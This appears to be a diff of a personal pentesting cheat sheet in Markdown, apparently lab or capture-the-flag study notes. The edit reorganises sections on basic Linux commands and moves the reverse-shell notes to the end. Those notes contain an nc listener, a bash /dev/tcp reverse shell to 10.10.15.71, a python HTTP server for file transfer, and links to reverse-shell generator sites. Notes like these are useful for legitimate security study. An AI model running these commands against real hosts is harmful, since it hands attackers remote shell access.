@@ -43,14 +43,6 @@ echo os.system('/bin/bash') # or echo os.system('/bin/sh')
 /bin/sh -i # or /bin/bash -i
 ```
 
-### Reverse Shell
-Shell from the target to the attacker.
-- possible to connect throught firewall
-#### Some Reverse Shell generators / links
-- [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-- [High on Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [Revshells](https://www.revshells.com/)
-
 ### Transfer files
 - httb, ftp, ssh, smb, scp, curl, wget, netcat etc
 ```sh
@@ -109,36 +101,28 @@ ss -tln
 sudo netstat -tulnp
 ```
 
-open reverse shell
+### Other Commands
 
-### Reverse shell Server
-- Kali contains a share folder with shell scrips
+#### whoami
 ```sh
-#create a listener for shell session
-nc -nvlp 1337
-
-#!/bin/bash
-bash -i >& /dev/tcp/10.10.15.71/1337 0>&1
-
-python3 -m http.server 8000
+whoami #print current user
 ```
-### other commands need to know
-
 #### uname
 ```sh
 uname -a #print system information
 ```
 #### get own ip
-```
+```sh
 ip a | grep tun0 
-
 ```
+#### ifconfig
+```sh
+ifconfig #print network information
+```
+
 #### pwd
 ```sh
 pwd #print working directory
-```
-```sh
-python -m http.server 8001
 ```
 
 #### Differences between files
@@ -158,4 +142,31 @@ sudo su #switch to root
 Suchen von Dateien
 ```sh
 locate PowerUp.ps1
+```
+
+#### arp
+```sh
+arp -e # get machines the target has spoken to
+```
+
+
+
+## Reverse shells Server
+- Kali contains a share folder with shell scrips
+- Shell from the target to the attacker.
+- possible to connect throught firewall
+
+#### Some Reverse Shell generators / links
+- [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [High on Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [Revshells](https://www.revshells.com/)
+
+```sh
+#create a listener for shell session
+nc -nvlp 1337
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.15.71/1337 0>&1
+
+python3 -m http.server 8000
 ```
